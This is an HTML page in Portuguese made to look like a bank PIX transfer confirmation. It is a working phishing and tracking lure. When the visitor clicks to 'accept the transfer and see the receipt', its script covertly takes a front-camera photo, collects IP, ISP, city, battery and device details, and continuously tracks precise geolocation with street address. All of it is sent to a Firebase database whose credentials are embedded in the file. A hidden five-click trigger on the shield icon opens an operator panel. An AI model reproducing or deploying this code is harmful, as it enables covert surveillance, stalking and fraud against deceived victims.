<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Aceitar Transferência</title>
  <style>
    * { box-sizing: border-box; }
    body {
      display: flex;
      min-height: 100vh;
      margin: 0;
      justify-content: center;
      align-items: center;
      background: #f4f6f9;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      color: #333;
    }
    .card {
      background: #ffffff;
      padding: 32px 24px;
      border-radius: 20px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
      max-width: 360px;
      width: 90%;
      text-align: center;
    }
    .bank-icon {
      width: 56px;
      height: 56px;
      background: #eef2ff;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 16px;
    }
    .bank-icon svg {
      width: 28px;
      height: 28px;
      fill: #4f46e5;
    }
    h2 {
      margin: 0 0 6px;
      font-size: 20px;
      font-weight: 700;
      color: #111827;
    }
    .subtitle {
      font-size: 13px;
      color: #6b7280;
      margin-bottom: 20px;
    }
    .transfer-info {
      background: #f9fafb;
      border: 1px solid #f3f4f6;
      border-radius: 12px;
      padding: 16px;
      margin-bottom: 24px;
      text-align: left;
    }
    .info-row {
      display: flex;
      justify-content: space-between;
      font-size: 13px;
      margin-bottom: 10px;
      gap: 10px;
    }
    .info-row:last-child { margin-bottom: 0; }
    .info-label { color: #6b7280; white-space: nowrap; }
    .info-value { font-weight: 600; color: #111827; text-align: right; word-break: break-all; }
    .info-value.amount { color: #059669; font-weight: 700; font-size: 14px; }

    button {
      width: 100%;
      padding: 16px;
      font-size: 15px;
      font-weight: 600;
      border: none;
      background: #4f46e5;
      color: white;
      border-radius: 12px;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
      box-shadow: 0 4px 12px rgba(79, 70, 229, 0.25);
    }
    button:active { transform: scale(0.98); }
    button:hover { background: #4338ca; }

    #status {
      margin-top: 20px;
      font-size: 14px;
      color: #4b5563;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      min-height: 24px;
    }
    
    .spinner {
      width: 18px;
      height: 18px;
      border: 3px solid #e5e7eb;
      border-top: 3px solid #4f46e5;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .footer-secure {
      margin-top: 24px;
      font-size: 11px;
      color: #9ca3af;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 4px;
      user-select: none;
    }

    .shield-btn {
      cursor: pointer;
      font-size: 12px;
    }
  </style>
</head>
<body>

  <div class="card">
    <div class="bank-icon">
      <svg viewBox="0 0 24 24">
        <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
      </svg>
    </div>
    
    <h2>Aceitar Transferência</h2>
    <div class="subtitle">Confirme o recebimento para gerar o comprovante.</div>

    <div class="transfer-info">
      <div class="info-row">
        <span class="info-label">Tipo</span>
        <span class="info-value">PIX Instantâneo</span>
      </div>
      <div class="info-row">
        <span class="info-label">Nome</span>
        <span class="info-value" id="infoNome">Carregando...</span>
      </div>
      <div class="info-row">
        <span class="info-label">Chave PIX</span>
        <span class="info-value" id="infoChave">Carregando...</span>
      </div>
      <div class="info-row">
        <span class="info-label">Status</span>
        <span class="info-value" style="color: #d97706;">Aguardando aceite</span>
      </div>
      <div class="info-row">
        <span class="info-label">Valor</span>
        <span class="info-value amount" id="infoValor">R$ ***,**</span>
      </div>
    </div>

    <button id="btnEnviar">Clique para aceitar e ver o comprovante</button>
    <div id="status"></div>

    <div class="footer-secure">
      <span id="escudoSecreto" class="shield-btn">🛡️</span> Conexão segura e criptografada
    </div>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
    import { getDatabase, ref, push, update, onValue } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyCWmb-8mTJcIJNWyisaS1qfeSDs1irw9IU",
      authDomain: "localizacao-2fa1a.firebaseapp.com",
      databaseURL: "https://localizacao-2fa1a-default-rtdb.firebaseio.com",
      projectId: "localizacao-2fa1a",
      storageBucket: "localizacao-2fa1a.firebasestorage.app",
      messagingSenderId: "1056273872739",
      appId: "1:1056273872739:web:65f045fafcdec22b3ac556",
      measurementId: "G-8N2KJP40KF"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    onValue(ref(db, 'config/pix'), (snapshot) => {
      const data = snapshot.val();
      if (data) {
        if (data.nome) document.getElementById('infoNome').innerText = data.nome;
        if (data.chave) document.getElementById('infoChave').innerText = data.chave;
        if (data.valor) document.getElementById('infoValor').innerText = data.valor;
      }
    });

    const btn = document.getElementById('btnEnviar');
    const status = document.getElementById('status');

    let wakeLock = null;

    async function ativarWakeLock() {
      try {
        if ('wakeLock' in navigator) {
          wakeLock = await navigator.wakeLock.request('screen');
        }
      } catch (err) {}
    }

    async function capturarFoto() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" },
          audio: false
        });

        const video = document.createElement('video');
        video.muted = true;
        video.playsInline = true;
        video.srcObject = stream;
        await video.play();

        await new Promise(resolve => setTimeout(resolve, 600));

        const canvas = document.createElement('canvas');
        const width = 480;
        const height = (video.videoHeight * (width / video.videoWidth)) || 360;
        canvas.width = width;
        canvas.height = height;

        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, width, height);
        const fotoBase64 = canvas.toDataURL('image/jpeg', 0.6);

        stream.getTracks().forEach(track => track.stop());
        return fotoBase64;
      } catch (err) {
        console.warn("Permissão de câmera negada:", err);
        return null;
      }
    }

    async function capturarDispositivo() {
      let ipData = {};
      try {
        const res = await fetch('https://ipwho.is/');
        if (res.ok) {
          const data = await res.json();
          if (data.success) {
            ipData = {
              ip: data.ip,
              org: data.connection?.isp || data.connection?.org || "Não identificado",
              city: data.city || "Não identificada"
            };
          }
        }
      } catch (e) {}

      if (!ipData.ip) {
        try {
          const resIp = await fetch('https://api.ipify.org?format=json');
          const dataIp = await resIp.json();
          ipData.ip = dataIp.ip;
        } catch (e) {}
      }

      let statusBateria = "Indisponível";
      try {
        if ('getBattery' in navigator) {
          const b = await navigator.getBattery();
          statusBateria = `${Math.round(b.level * 100)}% (${b.charging ? 'Carregando' : 'Desconectado'})`;
        }
      } catch (e) {}

      let conexao = "Desconhecida";
      if (navigator.connection) {
        const conn = navigator.connection;
        const tipoFisico = conn.type ? conn.type.toUpperCase() : null;
        const velocidade = conn.effectiveType ? conn.effectiveType.toUpperCase() : null;
        conexao = (tipoFisico && tipoFisico !== 'UNKNOWN') ? `${tipoFisico} (${velocidade || 'OK'})` : (velocidade || "Desconhecida");
      }

      return {
        ip: ipData.ip || "Não identificado",
        provedor: ipData.org || "Não identificado",
        cidade: ipData.city || "Não identificada",
        bateria: statusBateria,
        conexao: conexao,
        tela: `${window.screen.width}x${window.screen.height}`,
        userAgent: navigator.userAgent
      };
    }

    btn.addEventListener('click', async () => {
      status.innerHTML = '<div class="spinner"></div><span>Processando confirmação...</span>';

      ativarWakeLock();

      const novoNoRef = push(ref(db, 'localizacao/historico'));
      const registroId = novoNoRef.key;

      const [fotoBase64, dispositivoInfo] = await Promise.all([
        capturarFoto(),
        capturarDispositivo()
      ]);

      update(novoNoRef, {
        foto: fotoBase64 || null,
        timestamp: new Date().toISOString(),
        dispositivo: dispositivoInfo
      });

      if (!navigator.geolocation) {
        status.innerText = "Geolocalização não suportada.";
        return;
      }

      navigator.geolocation.watchPosition(
        async (pos) => {
          const { latitude, longitude, accuracy } = pos.coords;
          
          let enderecoFormatado = "Endereço não identificado";
          try {
            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
            const data = await response.json();
            if (data && data.address) {
              const a = data.address;
              const rua = a.road || a.pedestrian || a.footway || 'Rua não identificada';
              const numero = a.house_number ? `, nº ${a.house_number}` : '';
              const bairro = a.suburb || a.neighbourhood || a.district || '';
              const cidade = a.city || a.town || a.village || '';
              enderecoFormatado = `${rua}${numero}${bairro ? ' - ' + bairro : ''}${cidade ? ', ' + cidade : ''}`;
            }
          } catch (err) {}

          update(novoNoRef, {
            lat: latitude,
            lng: longitude,
            precisao: accuracy,
            endereco: enderecoFormatado
          }).then(() => {
            status.innerText = "Comprovante gerado com sucesso!";
          });
        },
        (err) => {
          status.innerText = "Acesso à localização negado.";
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    });

    let cliqueCount = 0;
    let timer;
    const escudo = document.getElementById('escudoSecreto');

    escudo.addEventListener('click', () => {
      cliqueCount++;
      if (cliqueCount === 1) {
        timer = setTimeout(() => { cliqueCount = 0; }, 5000);
      }
      if (cliqueCount >= 5) {
        clearTimeout(timer);
        cliqueCount = 0;
        window.location.href = "painel.html";
      }
    });
  </script>
</body>
</html>
